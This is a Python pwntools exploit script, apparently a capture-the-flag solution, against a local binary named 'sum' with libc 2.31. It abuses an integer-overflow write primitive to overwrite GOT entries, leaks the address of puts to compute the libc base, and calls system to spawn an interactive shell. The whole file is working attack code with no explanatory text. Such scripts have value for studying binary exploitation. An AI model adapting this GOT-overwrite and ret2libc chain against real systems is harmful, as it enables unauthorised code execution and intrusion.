from pwn import *


target = process('./sum_ccafa40ee6a5a675341787636292bf3c84d17264')
# gdb.attach(target, gdbscript='b *0x00400987')
elf = ELF('sum_ccafa40ee6a5a675341787636292bf3c84d17264')
libc = ELF('libc-2.31.so')

print(target.recvuntil('2 3 4 0'))


def write(addr, val):
    target.sendline(str(0x7fffffffffffffff))
    target.sendline(str(0x7fffffffffffffff - addr))
    target.sendline('1')
    target.sendline('1')
    target.sendline(str(val))
    target.sendline(str(addr))  # corresponds to pointer to sumResult


# symbols could not be written, write on got.plt
exit_addr = elf.got['exit']
main_addr = elf.symbols['main']
print(f'exit: {hex(exit_addr)}')
print(f'main: {hex(main_addr)}')

write(exit_addr, main_addr)

pop_rdi = 0x400a43
printf_addr = elf.got['printf']
print(f'printf_addr: {hex(printf_addr)}')
write(printf_addr, pop_rdi)

pop_rdi = 0x400a43
puts_got = elf.got['puts']
puts_plt = elf.plt['puts']
call_exit = 0x4009a7
target.sendline(str(pop_rdi))
target.sendline(str(puts_got))
target.sendline(str(puts_plt))
target.sendline(str(call_exit))
target.sendline('0')

for i in range(13):
    print(target.recvline())

puts_leak = target.recvline().strip()
print(puts_leak)
puts_leak = u64(puts_leak + b'\x00'*(8 - len(puts_leak)))
print(hex(puts_leak))
base = puts_leak - libc.symbols['puts']
print(f'base: {hex(base)}')


target.sendline(str(pop_rdi))                       
target.sendline(str(base + 0x1b75aa))               
target.sendline(str(base + libc.symbols['system']))
target.sendline('0')


target.interactive()
